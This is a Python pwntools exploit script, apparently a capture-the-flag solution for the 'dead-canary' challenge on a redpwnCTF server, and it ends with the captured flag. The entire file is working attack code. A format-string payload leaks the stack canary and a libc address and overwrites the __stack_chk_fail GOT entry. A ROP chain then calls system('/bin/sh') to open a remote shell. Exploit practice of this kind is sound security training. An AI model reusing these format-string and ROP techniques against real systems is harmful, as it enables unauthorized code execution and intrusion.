from pwn import *


def exploit(p):
    stack_chk_fail_got = 0x601028
    main = 0x00400737

    ################# PAYLOAD 1 ##############################

    # 41st argument to printf is the return address where the main function returns inside __libc_start_main
    # 39th argument is the canary
    # printing enough values to fill the 11th argument i.e __stack_chk_fail GOT entry to a value 0x400737 ( address of main )
    pay = b'%41$016llx;%39$016llx;%04196117d%11$n000' + p64(stack_chk_fail_got)
    pay += (0x110 - 8 - len(pay)) * b'a'
    print(p.recvuntil(b'What is your name: '))

    # Canary's first byte is always \x00 so we can safely smash the canary by just changing it to \x01
    p.send(pay + b'\x01')

    main_return_addr = int(p.recvuntil(b';').split(b' ')[1][:-1], 16)
    canary = int(p.recvuntil(b';')[:-2] + b'0', 16)

    # __libc_start_main starts at a backward offset 231 from where the main execution is supposed to return
    libc_main = main_return_addr - 231
    log.info("Retrived libc_main address --> %s" % hex(libc_main))
    log.info("Retrieved canary --> %s" % hex(canary))

    p.recvuntil(b'What is your name: ')
    log.info("New prompt recieved")

    # Calculate other offsets using the start of __libc_start_main we obtained
    system_addr = (0x000000000004f440 - 0x0000000000021ab0) + libc_main
    binsh_main_offset = 1647594
    binsh_addr = binsh_main_offset + libc_main  # This is a pointer to the string "/bin/sh" inside libc.so.6
    ret = 0x00000000004005d6  # A simple gadget ret;

    ###################### PAYLOAD 2 #################################

    rop = 0x00000000004008e3  # pop rdi; ret

    pay = b''
    pay += p64(binsh_addr)  # This needs to be placed in rdi
    pay += p64(ret)  # This is to make rsp 16 byte aligned which the movaps instruction requires inside call to system()
    pay += p64(system_addr)  # This is the address of system() calculated which our ROP will return to
    pay += (0x110 - len(pay)) * b'a'  # Purposeful smashing of the canary

    p.send(pay)

    print(p.recvuntil(b'What is your name: '))
    log.info("New prompt recieved")

    ####################### PAYLOAD 3 ################################

    pay = b''
    pay += b'a' * (0x110 - 8 - len(pay))  # Padding
    pay += p64(canary)  # Real value of the canary
    pay += b'a' * 8  # Fake rbp
    pay += p64(rop)  # Now main should return to our rop gadget
    # Our stack arguments that the rop gadget requires are set, thanks to PAYLOAD-2

    p.send(pay)
    p.recvuntil('a' * 264)
    p.interactive()


# p=process('./dead-canary')
HOST = "2020.redpwnc.tf"
PORT = 31744
p = remote(HOST, PORT)

# Enjoy your shell
exploit(p)

# FLAG --> flag{t0_k1ll_a_canary_4e47da34}
